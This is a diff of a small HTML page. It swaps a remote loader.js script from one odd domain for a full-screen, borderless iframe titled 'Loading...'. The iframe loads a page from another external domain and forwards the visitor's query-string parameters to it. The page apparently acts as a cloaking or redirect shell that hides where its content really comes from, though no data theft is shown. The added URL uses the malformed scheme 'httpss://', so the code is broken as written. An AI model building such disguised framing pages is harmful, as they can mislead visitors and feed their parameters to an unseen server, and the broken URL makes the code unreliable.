@@ -1,11 +1,21 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title></title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body, html { margin:0; padding:0; height:100%; width:100%; overflow:hidden; }
+        iframe { width:100%; height:100%; border:none; }
+    </style>
 </head>
 <body>
-    <script src="https://huhu.kf2013.site/loader.js"></script>
+    <iframe id="frame" src=""></iframe>
+    <script>
+        // 自动读取当前页面的所有参数 (?t=123...)
+        const params = window.location.search;
+        // 拼接你的服务器页面地址
+        document.getElementById('frame').src = "httpss://kmkm.rrgnf.cn/index.html" + params;
+    </script>
 </body>
 </html>
